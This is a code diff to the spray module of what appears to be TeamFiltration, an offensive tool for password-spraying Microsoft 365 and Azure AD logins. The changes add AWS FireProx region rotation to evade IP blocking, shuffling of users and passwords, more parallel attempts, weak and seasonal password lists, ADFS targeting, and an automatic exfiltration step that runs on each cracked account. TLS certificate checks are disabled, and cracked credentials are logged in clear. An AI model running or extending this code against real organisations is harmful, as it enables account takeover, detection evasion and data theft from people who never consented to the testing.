@@ -16,145 +16,26 @@ using TeamFiltration.Helpers;
 using TeamFiltration.Models.TeamFiltration;
 using System.Text.RegularExpressions;
 using TeamFiltration.Models.MSOL;
+using TimeZoneConverter;
 
 namespace TeamFiltration.Modules
 {
     class Spray
     {
-        private static async Task<bool> CheckForAdfs(string email, GlobalArgumentsHandler _globalProperties)
-        {
-            //This does not need to be FireProx
-            //var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
-            var url = $"https://login.microsoftonline.com/getuserrealm.srf?login={email}&xml=1";
-
-            var proxy = new WebProxy
-            {
-                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
-                BypassProxyOnLocal = false,
-                UseDefaultCredentials = false
-            };
-
-            var httpClientHandler = new HttpClientHandler
-            {
-                Proxy = proxy,
-                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
-                {
-                    return true;
-                },
-                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
-                UseProxy = _globalProperties.DebugMode
-            };
-
-            using (var clientHttp = new HttpClient(httpClientHandler))
-            {
-
-                var getAsyncReq = await clientHttp.GetAsync(url);
-
-                if (getAsyncReq.IsSuccessStatusCode)
-                {
-                    var postAsyncResp = await getAsyncReq.Content.ReadAsStringAsync();
-
-                    if (postAsyncResp.Contains("/adfs/ls/?username"))
-                    {
-                        return true;
-                    }
-
-                }
-            }
-
-            return false;
 
 
-        }
 
-        private static async Task<UserRealmResp> CheckUserRealm(string email, GlobalArgumentsHandler _globalProperties)
-        {
-            var userRealObject = new UserRealmResp() { };
-
-            //This does not need fireprox?
-
-            //var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
-
-            // var UsGovUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.us", 0) + $"getuserrealm.srf?login={email}&xml=1";
-
-            var url = $"https://login.microsoftonline.com/getuserrealm.srf?login={email}&xml=1";
-            var UsGovUrl = $"https://login.microsoftonline.us/getuserrealm.srf?login={email}&xml=1";
-
-            var proxy = new WebProxy
-            {
-                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
-                BypassProxyOnLocal = false,
-                UseDefaultCredentials = false
-            };
-
-            var httpClientHandler = new HttpClientHandler
-            {
-                Proxy = proxy,
-                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
-                {
-                    return true;
-                },
-                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
-                UseProxy = _globalProperties.DebugMode
-            };
-
-            using (var clientHttp = new HttpClient(httpClientHandler))
-            {
-
-                var getAsyncReq = await clientHttp.GetAsync(url);
-
-                if (getAsyncReq.IsSuccessStatusCode)
-                {
-                    var userRealmData = await getAsyncReq.Content.ReadAsStringAsync();
-
-                    Regex authUrlRegex = new Regex(@"(?<=<AuthUrl>)(.*?)(?=<\/AuthUrl>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
-                    MatchCollection authUrlMatches = authUrlRegex.Matches(userRealmData);
-                    if (authUrlMatches.Count > 0)
-                    {
-
-                        var AuthUrl = authUrlMatches[0].Value;
-                        userRealObject.ThirdPartyAuthUrl = AuthUrl;
-                        userRealObject.ThirdPartyAuth = true;
-                    }
-                    if (userRealmData.Contains("/adfs/ls/?username"))
-                        userRealObject.Adfs = true;
-
-                }
-
-                var getAsyncUsGovReq = await clientHttp.GetAsync(UsGovUrl);
-
-                if (getAsyncUsGovReq.IsSuccessStatusCode)
-                {
-                    var userRealmData = await getAsyncUsGovReq.Content.ReadAsStringAsync();
-
-                    Regex UsGovRegex = new Regex(@"(?<=<CloudInstanceName>)(.*?)(?=<\/CloudInstanceName>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
-                    MatchCollection usGovMatches = UsGovRegex.Matches(userRealmData);
-                    if (usGovMatches.Count > 0)
-                    {
-                        var usGovUrl = usGovMatches[0].Value;
-                        if (usGovUrl.Contains("microsoftonline.us"))
-                            userRealObject.UsGovCloud = true;
-                    }
-
-                }
-            }
-
-            return userRealObject;
-        }
-
-
-        private static async Task SprayAttemptWrap(SprayAttempt sprayAttempt, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp)
+        public static async Task<SprayAttempt> SprayAttemptWrap(SprayAttempt sprayAttempt, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp)
         {
 
-            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
-            var _checkMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
-
+            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY", _databaseHandler);
 
 
             try
             {
                 var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
 
+                //Check if we got an access token in response
                 if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                 {
                     if (userRealmResp.Adfs)
@@ -165,6 +46,7 @@ namespace TeamFiltration.Modules
                     sprayAttempt.Valid = true;
 
                 }
+
                 else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                 {
                     var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
@@ -211,10 +93,10 @@ namespace TeamFiltration.Modules
 
 
 
-
+            return sprayAttempt;
 
         }
-        private static async Task SprayAttemptWrap(
+        private static async Task<List<SprayAttempt>> SprayAttemptWrap(
             List<SprayAttempt> sprayAttempts,
             GlobalArgumentsHandler teamFiltrationConfig,
             DatabaseHandler _databaseHandler,
@@ -223,35 +105,38 @@ namespace TeamFiltration.Modules
             int regionCounter = 0)
         {
 
-            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
-            var _checkMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
+            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY", _databaseHandler);
 
-            (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject;
-
-            if (teamFiltrationConfig.AADSSO)
-                fireProxObject = teamFiltrationConfig.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
-
-            else if (teamFiltrationConfig.UsCloud)
-                fireProxObject = teamFiltrationConfig.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
-            else
-                fireProxObject = teamFiltrationConfig.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
-
+            var validSprayAttempts = new List<SprayAttempt>() { };
             await sprayAttempts.ParallelForEachAsync(
                   async sprayAttempt =>
                           {
                               try
                               {
-                                  sprayAttempt.FireProxURL = teamFiltrationConfig.AADSSO ? fireProxObject.fireProxUrl : fireProxObject.fireProxUrl + "/common/oauth2/token/";
-                                  sprayAttempt.FireProxRegion = fireProxObject.Item2.Region;
 
-                                  var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
+
+                                  (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
 
                                   if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                                   {
-                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
+                                      if (!userRealmResp.Adfs)
+                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
+                                      else
+                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                                       sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                                       sprayAttempt.Valid = true;
 
+                                  }
+                                  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description) && userRealmResp.Adfs)
+                                  {
+                                      if (loginResp.bearerTokenError.error_description.Contains("User does not exsists?"))
+                                          sprayAttempt.Disqualified = true;
+
+                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {loginResp.bearerTokenError?.error_description}", sprayAttempt.FireProxRegion), true, true);
+
+                                      sprayAttempt.ResponseCode = loginResp.bearerTokenError?.error_description;
+                                      sprayAttempt.Valid = false;
+                                      sprayAttempt.ConditionalAccess = false;
                                   }
                                   else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                                   {
@@ -288,6 +173,9 @@ namespace TeamFiltration.Modules
 
                                   }
 
+                                  if (sprayAttempt.Valid)
+                                      validSprayAttempts.Add(sprayAttempt);
+
                                   _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
                                   Thread.Sleep(delayInSeconds * 1000);
                               }
@@ -298,18 +186,17 @@ namespace TeamFiltration.Modules
                               }
                               _databaseHandler._globalDatabase.Checkpoint();
                           },
-                            maxDegreeOfParallelism: 3);
+                            maxDegreeOfParallelism: 20);
 
 
-            await teamFiltrationConfig._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
 
+            return validSprayAttempts;
         }
         public static async Task SprayAsync(string[] args)
         {
-            var alertMsg = true;
+            Random rnd = new Random();
+
             var forceBool = args.Contains("--force");
-
-
 
             int sleepInMinutesMax = 100;
             int sleepInMinutesMin = 60;
@@ -323,6 +210,11 @@ namespace TeamFiltration.Modules
             var exludeListPath = args.GetValue("--exclude");
             var comboListPath = args.GetValue("--combo");
 
+            var shuffleUsersBool = args.Contains("--shuffle-users");
+            bool shufflePasswordsBool = args.Contains("--shuffle-passwords");
+            bool shuffleFireProxBool = args.Contains("--shuffle-regions");
+            bool autoExfilBool = args.Contains("--auto-exfil");
+
             List<string> passwordList = new List<string>() { };
 
             string[] excludeList = new string[] { };
@@ -331,6 +223,8 @@ namespace TeamFiltration.Modules
 
             var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);
 
+            DateTime StarTimeParsed = new DateTime();
+            DateTime StopTimeParsed = new DateTime();
 
             //Calcuate time format for spraying to happen
             if (args.Contains("--time-window"))
@@ -339,6 +233,23 @@ namespace TeamFiltration.Modules
 
                 StarTime = rawInputTime.Trim().Split("-")[0];
                 StopTime = rawInputTime.Trim().Split("-")[1];
+
+                DateTime.TryParseExact(StarTime, "HH:mm", new CultureInfo("en-US"), DateTimeStyles.None, out StarTimeParsed);
+
+                DateTime.TryParseExact(StopTime, "HH:mm", new CultureInfo("en-US"), DateTimeStyles.None, out StopTimeParsed);
+
+                if (StarTimeParsed == new DateTime())
+                {
+                    Console.WriteLine($"[!] Failed to parse provided StarTime {StarTime}");
+                    Environment.Exit(0);
+                }
+                if (StarTimeParsed == new DateTime())
+                {
+
+                    Console.WriteLine($"[!] Failed to parse provided StopTime {StopTime}");
+                    Environment.Exit(0);
+                }
+
 
                 databaseHandle.WriteLog(new Log("SPRAY", $"Spraying will only occur between {StarTime}-{StopTime}"));
             }
@@ -354,9 +265,9 @@ namespace TeamFiltration.Modules
                 sleepInMinutesMin = Convert.ToInt32(args.GetValue("--sleep-min"));
             }
 
-            if (args.Contains("--delay"))
+            if (args.Contains("--jitter"))
             {
-                delayInSeconds = Convert.ToInt32(args.GetValue("--delay"));
+                delayInSeconds = Convert.ToInt32(args.GetValue("--jitter"));
             }
             else
             {
@@ -382,22 +293,23 @@ namespace TeamFiltration.Modules
                 if (args.Contains("--common-only"))
                     passwordList.AddRange(Helpers.Generic.GenerateWeakPasswords());
 
-                //By Default do months and seasons
+                //By Default do them all
                 if (passwordList.Count() == 0)
                 {
+                    passwordList.AddRange(Helpers.Generic.GenerateSeasonPasswords());
                     passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());
-                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());
+                    passwordList.AddRange(Helpers.Generic.GenerateWeakPasswords());
                 }
 
             }
             else if (File.Exists(passwordListPath))
-                passwordList = File.ReadAllLines(passwordListPath).ToList();
+                passwordList = File.ReadAllLines(passwordListPath).Where(x => !string.IsNullOrEmpty(x)).ToList();
 
-            //Get a list of nice valid users from the DB
-            string[] userNameListGlobal = databaseHandle.QueryValidAccount().Select(x => x.Username.ToLower()).ToArray();
+            //Get a list of valid users from the DB
+            string[] userNameListGlobal = databaseHandle.QueryValidAccount().Select(x => x.Username.ToLower()).Distinct().ToArray();
 
-
-            var getUserRealmResult = await CheckUserRealm(userNameListGlobal.FirstOrDefault(), _globalProperties);
+            //Pick the first user to enumerate some basic information about the Tenant
+            var getUserRealmResult = await Helpers.Generic.CheckUserRealm(userNameListGlobal.FirstOrDefault(), _globalProperties);
 
             if (getUserRealmResult.UsGovCloud)
             {
@@ -407,7 +319,7 @@ namespace TeamFiltration.Modules
 
             if (getUserRealmResult.ThirdPartyAuth && !getUserRealmResult.Adfs)
             {
-                databaseHandle.WriteLog(new Log("SPRAY", $"Third party authentication detected - Spraying will potentially not work properly, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
+                databaseHandle.WriteLog(new Log("SPRAY", $"Third party authentication detected - Spraying will NOT work properly, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
                 Environment.Exit(0);
             }
 
@@ -415,7 +327,9 @@ namespace TeamFiltration.Modules
             //Check if this client has ADFS
             if (getUserRealmResult.Adfs && !_globalProperties.AADSSO)
             {
-                databaseHandle.WriteLog(new Log("SPRAY", $"ADFS detected, TeamFiltration ADFS support in early beta, be carefull :) "));
+                databaseHandle.WriteLog(new Log("SPRAY", $"ADFS federation detected => {getUserRealmResult.ThirdPartyAuthUrl}"));
+                databaseHandle.WriteLog(new Log("SPRAY", $"TeamFiltration ADFS support in beta, be carefull :) "));
+                _globalProperties.ADFS = true;
 
             }
 
@@ -426,210 +340,184 @@ namespace TeamFiltration.Modules
 
             //Generate a random sleep time based on min-max
             var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);
+            var regionCounter = rnd.Next(_globalProperties.AWSRegions.Length - 1);
 
+        sprayCalc:
 
-            if (!string.IsNullOrEmpty(comboListPath))
+            if (args.Contains("--time-window"))
             {
-                if (File.Exists(comboListPath))
+                if (!Helpers.Generic.IsBewteenTwoDates(DateTime.Now, StarTimeParsed, StopTimeParsed))
                 {
+                    //If we are passed stoptime, we are waiting for the startime the next day, same goes for stoptime
+                    StarTimeParsed = StarTimeParsed.AddDays(1);
+                    StopTimeParsed = StarTimeParsed.AddDays(1);
 
-                    var nonSprayed = new List<string> { };
-                    var sprayed = new List<string> { };
+                    databaseHandle.WriteLog(new Log("SPRAY", $"Pausing spraying until {StarTimeParsed}"));
 
-                    var regionCounter = 0;
+                    //Minute since that
+                    int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(StarTimeParsed).TotalMinutes);
 
-                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject;
-
-
-                    if (_globalProperties.AADSSO)
-                        fireProxObject = _globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
-
-                    else if (_globalProperties.UsCloud)
-                        fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
-                    else
-                        fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
-
-
-                    foreach (var userCombo in File.ReadAllLines(comboListPath)?.Where(x => !string.IsNullOrEmpty(x)))
-                    {
-                        var randomResource = Helpers.Generic.RandomO365Res();
-
-
-                        var sprayBuff = new SprayAttempt()
-                        {
-
-                            Username = userCombo.Split(":")[0],
-                            Password = userCombo.Split(":")[1],
-                            FireProxURL = _globalProperties.AADSSO ? fireProxObject.fireProxUrl : fireProxObject.fireProxUrl + "/common/oauth2/token/",
-                            FireProxRegion = fireProxObject.Item2.Region,
-                            ResourceClientId = randomResource.clientId,
-                            ResourceUri = randomResource.Uri,
-                            AADSSO = _globalProperties.AADSSO,
-                            ADFS = getUserRealmResult.Adfs
-                        };
-
-
-
-
-                        if (!sprayed.Select(x => x.Split(":")[0].ToLower()).Contains(userCombo.Split(":")[0].ToLower()))
-                        {
-                            await SprayAttemptWrap(sprayBuff, _globalProperties, databaseHandle, getUserRealmResult);
-                            sprayed.Add(userCombo);
-                            Thread.Sleep(delayInSeconds * 1000);
-                        }
-                        else
-                            nonSprayed.Add(userCombo);
-
-
-                    }
-
-                    File.WriteAllLines(comboListPath.Replace(".txt", "_extra.txt"), nonSprayed);
-
-
-                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+                    //time left to sleep based on this
+                    int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
+                    Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
 
                 }
+            }
+
+
+            var listOfSprayAttempts = new List<SprayAttempt>() { };
+
+
+            //Query Disqualified accounts
+            List<SprayAttempt> diqualifiedAccounts = databaseHandle.QueryDisqualified();
+
+            //Remove Disqualified accounts from the spray list
+            var bufferuserNameList = userNameListGlobal.Except(diqualifiedAccounts.Select(x => x.Username.ToLower())).ToList();
+
+            //Query emails that has been sprayed in the last X minutes (based on sleep time)
+            var accountsRecentlySprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).ToList();
+
+            //If all accounts has been sprayed in the last 90 minutes, and we are not forcing sprays, sleep
+            if (accountsRecentlySprayed.Select(x => x.Username.ToLower()).Distinct().Count() >= bufferuserNameList.Count() && !forceBool)
+            {
+                //Find spray attempt most recent
+                var mostRecentAccountSprayed = accountsRecentlySprayed.OrderByDescending(x => x?.DateTime).FirstOrDefault().DateTime;
+
+                //Minute since that
+                int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(mostRecentAccountSprayed).TotalMinutes);
+
+                //time left to sleep based on this
+                int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
+                TimeZoneInfo easternZone = TZConvert.GetTimeZoneInfo("Eastern Standard Time");
+
+
+                databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
+                Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
+                goto sprayCalc;
+            }
+            //If we are forcing spray, go ahead
+            else if (forceBool)
+            {   //however only force one round
+                forceBool = false;
+            }
+            else if (accountsRecentlySprayed.Count() > 0)
+            {   //Since we are finishing up a previous spray, remove the ones to not hit
+                bufferuserNameList = bufferuserNameList.Except(accountsRecentlySprayed.Select(x => x.Username.ToLower())).ToList();
+                databaseHandle.WriteLog(new Log("SPRAY", $"Uneven spray round detected"));
+            }
+
+
+            //Get all previous password and email combinations
+            List<string> allCombos = databaseHandle.QueryAllCombos();
+
+            var fireProxList = new List<(Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl)>();
+
+            if (shuffleUsersBool)
+                bufferuserNameList = bufferuserNameList.Randomize().ToList();
+
+
+            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
+            {
+                if (_globalProperties.AADSSO)
+                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
+                else if (_globalProperties.UsCloud)
+                {
+                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
+                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "/common/oauth2/token/";
+                    fireProxList.Add(fireProxObject);
+
+
+                }
+                else if (_globalProperties.ADFS)
+                {
+                    Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
+                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
+                    string adfsFireProxUrl = adfsFireProxObject.fireProxUrl.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
+                    adfsFireProxObject.fireProxUrl = adfsFireProxUrl;
+                    fireProxList.Add(adfsFireProxObject);
+                }
+
                 else
-                {
-                    databaseHandle.WriteLog(new Log("SPRAY", $"Combo list path does not exist. Check your path."));
-                    Environment.Exit(1);
-                }
+                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount));
 
+                if (!shuffleFireProxBool)
+                    break;
             }
+
+
+            await bufferuserNameList.ParallelForEachAsync(
+               async userName =>
+               {
+
+                   if (shufflePasswordsBool)
+                       passwordList = passwordList.Randomize().ToList();
+
+                   foreach (var password in passwordList)
+                   {
+                       var fireProxObject = fireProxList.First();
+
+                       if (shuffleFireProxBool)
+                           fireProxObject = fireProxList.Randomize().First();
+
+                       //If this combo does NOT exsits, add it
+                       if (!allCombos.Contains(userName.ToLower() + ":" + password))
+                       {
+                           var randomResource = Helpers.Generic.RandomO365Res();
+
+                           listOfSprayAttempts.Add(new SprayAttempt()
+                           {
+
+                               Username = userName,
+                               Password = password,
+                               //ComboHash = "",
+                               FireProxURL = fireProxObject.fireProxUrl,
+                               FireProxRegion = fireProxObject.Item2.Region,
+                               ResourceClientId = randomResource.clientId,
+                               ResourceUri = randomResource.Uri,
+                               AADSSO = _globalProperties.AADSSO,
+                               ADFS = getUserRealmResult.Adfs
+                           });
+                           break;
+                       }
+                   }
+               },
+                 maxDegreeOfParallelism: 500);
+
+            if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
+                regionCounter = 0;
             else
+                regionCounter++;
+
+            //If i get to this point without any spray items in listOfSprayAttempts,i have nothing left
+            if (listOfSprayAttempts.Count() == 0)
             {
-
-                //Counter to rotate over the FireProx API endspoints
-                var regionCounter = 0;
-
-                int forceCount = 0;
-
-                foreach (string password in passwordList)
+                foreach (var fireProxObject in fireProxList)
                 {
-                    //We need to do this every round beacuse stuff can change during the spray!
-                    var listOfSprayAttempts = new List<SprayAttempt>() { };
-
-                    //Query disabled accounts
-                    List<SprayAttempt> diqualifiedAccounts = databaseHandle.QueryDisqualified();
-
-                    //Remove those disabled accounts, no need to spray with these
-                    var bufferuserNameList = userNameListGlobal.Except(diqualifiedAccounts.Select(x => x.Username.ToLower())).ToArray();
-
-                    //If we don't have any users now, we won't get any new ones during spray. Let's exit
-                    if (bufferuserNameList.Count() == 0)
-                    {
-                        databaseHandle.WriteLog(new Log("SPRAY", $"There are NO non-disqualified emails to spray, go back and enum more!"));
-                        Environment.Exit(0);
-                    }
-
-
-                    List<string> allCombos = databaseHandle.QueryAllComboHash();
-
-                    //Generate those combinations super fast!
-                    await bufferuserNameList.ParallelForEachAsync(
-                    async userName =>
-                    {
-                        //Check if this combo exsists in the DB
-                        var randomResource = Helpers.Generic.RandomO365Res();
-
-                        string bufferHash = Helpers.Generic.CreateMD5(userName.ToLower() + ":" + password);
-
-                        //If this combo does NOT exsits, add it
-                        if (!allCombos.Contains(bufferHash))
-                        {
-                            listOfSprayAttempts.Add(new SprayAttempt()
-                            {
-
-                                Username = userName,
-                                Password = password,
-                                ComboHash = bufferHash,
-                                //FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
-                                //FireProxRegion = fireProxObject.Item2.Region,
-                                ResourceClientId = randomResource.clientId,
-                                ResourceUri = randomResource.Uri,
-                                AADSSO = _globalProperties.AADSSO,
-                                ADFS = getUserRealmResult.Adfs
-                            });
-                        }
-                    },
-                      maxDegreeOfParallelism: 500);
-
-
-                    if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
-                        regionCounter = 0;
-                    else
-                        regionCounter++;
-
-                    if (listOfSprayAttempts.Count() > 0)
-                    {
-                        //Remove accounts that cannot be sprayed due to time-limit
-                        var mostRecentAccountSprayed = new DateTime();
-
-                        //Get the most recent account sprayed
-                        var recentAccountsSprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).ToArray();
-
-                        //If there where any recent sprayed accounts, use that time
-                        if (recentAccountsSprayed.Count() > 0)
-                        {
-                            //If there was, get the datetime of that spray attempt
-                            mostRecentAccountSprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).FirstOrDefault().DateTime;
-                        }
-                        else
-                        {
-                            //If not, just use this dummy time so we can spray
-                            mostRecentAccountSprayed = DateTime.Now.AddDays(-1);
-                        }
-
-                        int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(mostRecentAccountSprayed).TotalMinutes);
-
-                        int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
-
-                        if (timeLeftToSleep > 0)
-                        {
-                            if (forceCount == 1)
-                                forceBool = false;
-
-                            if (forceBool)
-                            {
-                                if (alertMsg)
-                                {
-                                    databaseHandle.WriteLog(new Log("SPRAY", $"There has only been {minutesSinceFirstAccountSprayed} minutes since last spray, be careful about lockout!"));
-                                    alertMsg = false;
-                                    forceCount++;
-                                }
-
-                            }
-                            else
-                            {
-                                databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping the remaining {timeLeftToSleep} since last spray (Use --force to overrule)!"));
-                                Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
-                            }
-                        }
-
-                        //If we have any accounts left, spray them
-
-                        if (args.Contains("--time-window"))
-                        {
-                            bool prompted = false;
-                            while (true)
-                            {
-                                if (!Helpers.Generic.TimeToSleep(StarTime, StopTime))
-                                    break;
-                                if (!prompted)
-                                    databaseHandle.WriteLog(new Log("SPRAY", $"Pausing spraying until {StarTime}"));
-                                Thread.Sleep(50000);
-                                prompted = true;
-                            }
-                        }
-                        await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
-
-
-
-
-                    }
+                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+                    Environment.Exit(0);
                 }
             }
+                
 
+            var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
+
+            foreach (var fireProxObject in fireProxList)
+            {
+                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+            }
+
+
+            if (autoExfilBool && validAccounts.Count() > 0)
+            {
+                foreach (var item in validAccounts)
+                {
+                    databaseHandle.WriteLog(new Log("SPRAY", $"Launching automatic exfiltration"));
+                    await Exfiltrate.ExfiltrateAsync(args, item.Username, databaseHandle);
+                }
+
+            }
+
+            goto sprayCalc;
         }
 
     }
